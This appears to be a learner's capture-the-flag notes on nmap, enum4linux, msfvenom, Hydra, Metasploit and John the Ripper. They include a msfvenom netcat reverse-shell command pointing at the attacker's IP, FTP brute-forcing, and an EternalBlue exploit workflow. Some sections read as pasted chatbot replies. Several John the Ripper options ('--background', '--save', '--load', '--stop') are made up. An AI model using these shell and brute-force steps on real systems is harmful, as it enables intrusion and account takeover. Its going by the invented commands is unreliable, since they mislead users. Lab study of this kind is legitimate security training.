
### Enum4Linux Summary

- **Purpose**: Enumerates SMB shares on Windows/Linux systems.
- **Function**: Wrapper for Samba tools to extract SMB information easily.
- **Availability**: Pre-installed on AttackBox; installable from GitHub.

###### Syntax:

```bash
enum4linux [options] ip
```

###### Common Tags and Functions:

- **-U**: Get user list
- **-M**: Get machine list
- **-N**: Get namelist dump (different from -U and -M)
- **-S**: Get share list
- **-P**: Get password policy info
- **-G**: Get group and member list
- **-a**: Full enumeration (all options above)


here i used 
enum4linux 10.10.212.180 -a


![[Pasted image 20250107192757.png]]


## Nmap

to look for **scripts**
- grep "ftp-anon" /usr/share/nmap/scripts/script.db  


good tcp aggressive scan and saving the file on current dir named : nmapthm
 
- └─$ sudo nmap -p- -A -T5 -sT 10.10.212.180  -oN nmapthm

also this works fine and simple using syn scan

- nmap -vv  -T5 -oN NmapScan -p- 10.10.147.81

after getting open ports you need to scan specific port like this in order to foxus on it

	sudo nmap -A -T4 -vv -p 8012 -oN NmapPortScan 10.10.147.81

Explanation of Changes:

- Removed `-sT`: It's unnecessary unless a full TCP connect scan is specifically needed.
- Removed `-sC`: It's included in `-A`.
- Adjusted `-T5` to `-T4`: `-T4` is fast but more reliable and less likely to cause issues with firewalls.


did an nmap scan 

found one open port now focus on it

**import**
	PORT     STATE SERVICE REASON  VERSION
	8012/tcp open  unknown syn-ack
	| fingerprint-strings: 
	|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
	|_    SKIDY'S BACKDOOR. Type .HELP to view commands


that scan says that this can be used ass a backdoor .   SKIDY'S BACKDOO.



## using msfvenom

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format


this did not work , how i fixed it :

ip a 

gets the ip the put it directly in lhost

└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.21.117.138 lport=4444 R

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

**"nc -lvnp [listening port]"**


Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

![[Pasted image 20250107223617.png]]


![[Pasted image 20250107223636.png]]


## Hydra


**Hydra** is a powerful password-cracking tool that supports **over 50 protocols**, including FTP. It can perform rapid **dictionary attacks** on various services.

**Command Syntax for Hydra:**

```bash
hydra -t 4 -l [username] -P [path to wordlist] -vV [target IP] ftp
```

### **Table: Fragile vs. Robust Protocols**

|**Category**|**Protocol**|**Explanation**|
|---|---|---|
|**Fragile Protocols**|||
||**SMTP**|Often rate-limited to prevent abuse; many servers lock accounts after a few failed attempts.|
||**FTP**|Older implementations are sensitive to high connection rates, leading to crashes or timeouts.|
||**HTTP/HTTPS (Web Forms)**|Web servers may implement CAPTCHA, rate-limiting, or block IPs after too many failed attempts.|
||**IMAP/POP3**|Email protocols often have strict security measures and lower tolerance for repeated failures.|
||**Telnet**|Legacy protocol with limited security; excessive requests may crash the service.|
||**RDP (Remote Desktop)**|May block IPs or lock accounts quickly after multiple failed logins.|
||**SNMP**|Not designed for authentication; high parallel connections can lead to service disruption.|
|**Robust Protocols**|||
||**SSH**|Designed to handle multiple connections; higher tolerance to brute-force attempts.|
||**SMB**|Resilient to high connection rates, especially on modern implementations.|
||**Kerberos**|Built for secure authentication, often used in enterprise networks, withstanding parallel brute-forcing.|
||**DNS**|Can handle many requests simultaneously, although brute-forcing subdomains may still be detected.|
||**LDAP**|Generally robust and scalable for high connection attempts, especially on enterprise systems.|

---

### **Key Notes:**

- **Fragile Protocols**: These are more likely to crash, lock accounts, or trigger defenses (CAPTCHA, IP bans) during brute-forcing attempts. Use **low thread counts** (e.g., `-t 4` or `-t 8`) for these.
- **Robust Protocols**: These can handle more concurrent connections and higher thread counts (e.g., `-t 16` or `-t 32`) without significant risk of service disruption.

This distinction isn’t absolute—always monitor the target’s behavior and adjust the thread count as needed.

###### **Breaking Down the Command**:

| **Section**             | **Function**                                                                      |
| ----------------------- | --------------------------------------------------------------------------------- |
| `hydra`                 | Executes the Hydra tool                                                           |
| `-t 4`                  | Specifies **4 parallel connections** for faster cracking                          |
| `-l [user]`             | Specifies the **username** for the account being targeted (e.g., "dale")          |
| `-P [path to wordlist]` | Specifies the path to a **wordlist** of potential passwords (e.g., "rockyou.txt") |
| `-vV`                   | Enables **verbose mode**, showing login attempts and results                      |
| `[target IP]`           | The **IP address** of the target machine                                          |
| `ftp`                   | Specifies the **FTP protocol** for Hydra to attack                                |

---

### **Key Notes:**

- **Fragile Protocols**: These are more likely to crash, lock accounts, or trigger defenses (CAPTCHA, IP bans) during brute-forcing attempts. Use **low thread counts** (e.g., `-t 4` or `-t 8`) for these.
- **Robust Protocols**: These can handle more concurrent connections and higher thread counts (e.g., `-t 16` or `-t 32`) without significant risk of service disruption.

###### **Example Command**:

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

This command will attempt to crack the FTP password for the user **dale** on the server at **10.10.10.6**, using the **rockyou.txt** wordlist.


## MetaSploit

Metasploit tip: View missing module options with show missing




### Metasploit Framework Intro

**Metasploit** is a widely used exploitation framework that plays a key role in penetration testing, supporting all phases of an engagement:

- **Information Gathering**
- **Scanning**
- **Exploitation**
- **Exploit Development**
- **Post-Exploitation**

It has two main versions:

- **Metasploit Pro**: Commercial version with a GUI, designed for automation and management of tasks.
- **Metasploit Framework**: Open-source, command-line version commonly used for penetration testing.

##### Key Components of Metasploit Framework

1. **msfconsole**: The main command-line interface for interacting with Metasploit.
2. **Modules**: Includes various types like exploits, scanners, payloads, etc.
3. **Tools**: Stand-alone tools for vulnerability research and penetration testing, such as **msfvenom**, **pattern_create**, and **pattern_offset**. These tools are useful for exploit development (beyond the scope here).

This room will help you master the **Metasploit Framework**, enabling you to efficiently find exploits, set parameters, and exploit vulnerable services on a target system. By the end of the module, you'll be comfortable navigating Metasploit's command-line interface.


#### Main Components of Metasploit

##### Metasploit Console

The **Metasploit console** is the primary interface to interact with various modules in the Metasploit Framework. You launch it using the command `msfconsole` from the terminal. This console allows you to use different modules to perform tasks like exploiting vulnerabilities, scanning targets, or executing brute-force attacks.

##### Key Concepts

1. **Exploit**: A piece of code designed to take advantage of a vulnerability in the target system.
2. **Vulnerability**: A flaw or weakness in the target system that can be exploited to gain unauthorized access or execute malicious actions.
3. **Payload**: The code that runs on the target system after the exploit is successful. It is designed to achieve the attacker's goal, such as gaining access to the system or extracting data.

##### Metasploit Modules

Metasploit modules are small, specialized components that perform specific tasks. They are categorized into different types based on their function:

- **Exploits**: Modules designed to exploit vulnerabilities in the target system.
- **Scanners**: Used to identify vulnerabilities or services on a target system.
- **Payloads**: Code that is executed on the target system after a successful exploit.
- **Auxiliary**: Used for tasks such as denial of service, fuzzing, and information gathering.
- **Post-exploitation**: Modules for tasks after successful exploitation, such as privilege escalation and data collection.

You will interact with these modules primarily through the **msfconsole** to conduct penetration testing tasks.


##### Finding modules

###### Auxiliary

Auxiliary modules in Metasploit are supporting components used for a variety of tasks such as scanning, crawling, and fuzzing. These modules assist in different phases of penetration testing but do not directly exploit vulnerabilities. You can find these modules in the **auxiliary** directory.

```
msfconsole > search auxiliary
```

###### Encoders

Encoders in Metasploit are used to encode the exploit and payload in a way that makes it less detectable by signature-based antivirus solutions. However, their success is limited as antivirus software may use additional checks to detect threats.

```
msfconsole > search encoder
```

###### Evasion

Evasion modules are designed to help evade detection by antivirus software and intrusion detection systems (IDS). Unlike encoders, these modules specifically focus on bypassing security systems that might block payloads.

```
msfconsole > search evasion
```

###### Exploits

Exploits are organized based on the target system. They are used to take advantage of vulnerabilities in the target to gain unauthorized access or control.

```
msfconsole > search exploit
```

###### NOPs

NOP (No Operation) modules are often used to pad payloads and create buffer sizes for exploits. These are represented in the Intel x86 CPU architecture as `0x90`.

```
msfconsole > search nop
```

###### Payloads

Payloads are the actual code executed on the target system after a successful exploit. They perform tasks such as opening a shell, running commands, or installing malware. Metasploit offers four categories of payloads:

- **Adapters**: Wrappers for other payloads, converting them into different formats (e.g., Powershell adapter).
- **Singles**: Self-contained payloads that don't require additional components.
- **Stagers**: Set up a communication channel with the target and help download the full payload.
- **Stages**: The second part of a staged payload, downloaded after the stager is executed.

```
msfconsole > search payload

```
###### Post

Post-exploitation modules are used after gaining access to a system. They help maintain access, gather further information, or escalate privileges.

```
msfconsole > search post

```
###### Finding Modules

You can explore the available modules in Metasploit under the **/opt/metasploit-framework/embedded/framework/modules** directory on your system.


Got it! Here’s the updated summary with the correct heading format:

#### **msfconsole Summary**

Metasploit Framework is a powerful penetration testing tool used to exploit vulnerabilities in systems. It allows users to interact with various modules such as exploits, payloads, and auxiliary modules, and provides an interactive environment for attackers to run tests and actions.

##### **Basic Commands**

1. **use**: This command loads a specific module (e.g., exploit, payload, auxiliary).
    
    - Example: `use exploit/windows/smb/ms17_010_eternalblue`
2. **show options**: Displays configuration options for the loaded module. This is crucial for setting up required parameters.
    
    - Example: Required options may include `RHOSTS`, `RPORT`, etc.
3. **show payloads**: Lists the available payloads compatible with the current exploit. Payloads define what happens once the exploit succeeds (e.g., reverse shell, Meterpreter).
    
4. **info**: Displays detailed information about the current module, including its description, vulnerabilities it targets, and references.
    
5. **search**: This command allows you to search for specific modules within the Metasploit database using keywords, CVE IDs, or module names.
    
    - Example: `search ms17-010` to find modules related to the MS17-010 vulnerability.
6. **ls**: Lists files and directories in the current context.
    
7. **back**: Exits the current module and returns to the main `msfconsole` prompt.
    

##### **Working with Modules**

- **Modules**: Metasploit is modular, meaning you can load different types of modules based on the task (e.g., exploits, scanners, payloads).
    
    - **Exploits**: Used to target vulnerabilities.
    - **Auxiliary**: Can perform tasks like scanning or fuzzing.
    - **Payloads**: Specify what happens after a successful exploit (e.g., shell, Meterpreter).
- **Setting Options**: Each module has specific settings (e.g., IP address, port). Use the `show options` command to see what needs to be configured.
    
- **Running the Exploit**: Once options are set, you can run the exploit using the `run` command, which attempts to exploit the target system.
    

##### **Search and Discovery**

- You can search for modules based on different criteria like type (`search type:auxiliary`) or keyword (e.g., CVE).

##### **Exploit Rank and Reliability**

- Modules are ranked based on reliability (e.g., Average, Great, Normal), which reflects their chances of success in real-world attacks.

Metasploit also provides extensive documentation and references for each module, including links to the original vulnerability details or related advisories.

Apologies for missing some parts in the previous response. Let me provide a more detailed overview based on the information provided, ensuring all essential elements are covered.

---

#### **Metasploit Workflow Overview**

##### **Module Context and Parameter Settings**

1. **Entering Metasploit Prompt:**
    
    - When you enter the Metasploit context, you will see different prompts based on your location within the system:
        - **Regular command prompt:** Cannot run Metasploit commands.
        - **Metasploit command prompt (`msf6 >`):** General prompt without a specific module selected.
        - **Module context prompt:** Once you select a module, you can use context-specific commands like `set`, `show options`, etc.
        - **Meterpreter prompt:** If a payload is successfully executed, this allows you to interact with the target system.
        - **Shell on target system:** If you get a direct shell, you interact with the target system using a regular command prompt.
2. **Setting Parameters:**
    
    - Use the `set PARAMETER_NAME VALUE` syntax to configure specific parameters for the module:
        - **RHOSTS**: IP address or range of the target machine.
        - **RPORT**: The port on the target machine that is vulnerable.
        - **LHOST** and **LPORT**: Your attacker's machine IP and port to receive connections.
        - **PAYLOAD**: The payload that you want to deploy on the target.
        - **SESSION**: Identifies sessions when multiple are created.
    - Use `show options` to verify if parameters are set correctly.

##### **Setting Global and Module-Specific Parameters**

- **Setg Command:**
    - Use `setg` to set parameters globally across all modules, e.g., `setg rhosts 10.10.165.39`. This prevents you from needing to repeatedly set parameters for each new module.
- **Unset Command:**
    - Use `unset PARAMETER_NAME` to clear individual parameters or `unset all` to clear all parameters.

##### **Exploit Execution and Interaction**

1. **Running an Exploit:**
    
    - Once the parameters are configured, use `exploit` to run the module.
    - The `exploit -z` flag can be used to run the exploit and send the session to the background once it opens.
2. **Using the `back` Command:**
    
    - The `back` command is used to exit the current module context and return to the Metasploit prompt.
3. **Launching a Vulnerability Scan (Auxiliary Modules):**
    
    - The `auxiliary/scanner/smb/smb_ms17_010` module is an example of a scanner used to check for MS17-010 vulnerabilities before running the exploit.

##### **Session Management**

1. **Session Creation:**
    
    - After a successful exploit, a **session** is created. It represents the communication between the target system and Metasploit. You can view all active sessions with `sessions`.
2. **Interacting with Sessions:**
    
    - To interact with a session, use the command `sessions -i <session_id>`. This allows you to interact with the compromised system (e.g., Meterpreter shell, command shell).
3. **Backgrounding Sessions:**
    
    - Use the `background` command to return to the Metasploit prompt while keeping the session active in the background.
4. **Session Listing:**
    
    - Use `sessions` to view active sessions.
5. **Session ID:**
    
    - Each session gets an ID number, which you can use to manage specific sessions. You can interact with, background, or even kill sessions based on their ID.

##### **Example Workflow:**

1. **Set Up and Launch Exploit:**
    
    - Use `use exploit/windows/smb/ms17_010_eternalblue`.
    - Set `rhosts` to the target's IP (e.g., `set rhosts 10.10.165.39`).
    - Run the exploit with `exploit`.
2. **Switch to a Scanning Module:**
    
    - After setting global parameters using `setg`, switch to a scanner module:
        - `use auxiliary/scanner/smb/smb_ms17_010`.
    - The parameters (like `rhosts`) will remain set.
3. **Background Session and Interact with It:**
    
    - Once the exploit creates a session, use `background` to return to the main prompt.
    - Use `sessions` to see active sessions and `sessions -i <id>` to interact with a specific session.

---

#### **Key Commands Recap**

- **Module Selection:**
    
    - `use <module_name>`: Select the module you want to use.
- **Set Parameters:**
    
    - `set PARAMETER_NAME VALUE`: Set a specific parameter for a module.
    - `setg PARAMETER_NAME VALUE`: Set a global parameter for all modules.
- **View Options:**
    
    - `show options`: Display available parameters for the selected module.
- **Execute Exploit:**
    
    - `exploit`: Run the exploit against the target.
    - `exploit -z`: Run the exploit and background the session.
- **Session Management:**
    
    - `sessions`: List all active sessions.
    - `sessions -i <id>`: Interact with a specific session.
    - `background`: Send the current session to the background.
    - `back`: Exit the module and return to the Metasploit prompt.
- **Unset Parameters:**
    
    - `unset PARAMETER_NAME`: Clear a specific parameter.
    - `unset all`: Clear all set parameters.

---




## John the ripper
 

### 1. Installation
First, you need to install John the Ripper. The installation process depends on your operating system.

#### On Linux:
You can install John the Ripper using the package manager. For example, on Debian-based systems like Ubuntu, you can use:
```sh
sudo apt-get update
sudo apt-get install john
```

### 2. Basic Usage
Once installed, you can use John the Ripper to crack passwords. Here are some basic commands:

#### Cracking a Single Hash:
To crack a single hash, you can use the following command:
```sh
john --format=<hash_type> <hash_file>
```
Replace `<hash_type>` with the type of hash you're dealing with (e.g., `raw-md5`, `sha256crypt`, etc.) and `<hash_file>` with the file containing the hash.

#### Example:
```sh
john --format=raw-md5 hash.txt
```

#### Cracking Multiple Hashes:
If you have multiple hashes in a file, you can use:
```sh
john --format=<hash_type> <hash_file>
```

#### Example:
```sh
john --format=raw-md5 hashes.txt
```

### 3. Using Wordlists
John the Ripper can use wordlists to attempt common passwords. You can specify a wordlist with the `--wordlist` option:
```sh
john --wordlist=<wordlist_file> <hash_file>
```

#### Example:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### 4. Running John the Ripper in the Background
If you want to run John the Ripper in the background and check the progress later, you can use:
```sh
john --background <hash_file>
```

To check the status later, use:
```sh
john --status
```

### 5. Saving and Loading Sessions
You can save the current session and load it later:
```sh
john --save
john --load
```

### 6. Custom Rules
John the Ripper supports custom rules for password cracking. You can create your own rule set and apply it using the `--rules` option:
```sh
john --rules --format=<hash_type> <hash_file>
```

### 7. Stopping John the Ripper
To stop John the Ripper, you can use:
```sh
john --stop
```

### 8. Viewing Cracked Passwords
After running John the Ripper, you can view the cracked passwords using:
```sh
john --show <hash_file>
```

#### Example:
```sh
john --show hashes.txt
```

### Example Scenario
Let's say you have a file `hashes.txt` containing the following MD5 hashes:
```
5f4dcc3b5aa765d61d8327deb882cf99
e38ad214943daad1d64c102faec29de4
```

You can run John the Ripper to crack these hashes using a wordlist:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```

After running, you can check the status and view the cracked passwords:
```sh
john --status
john --show hashes.txt
```

That's a basic overview of how to use John the Ripper. If you have any specific questions or need more advanced usage examples, feel free to ask!




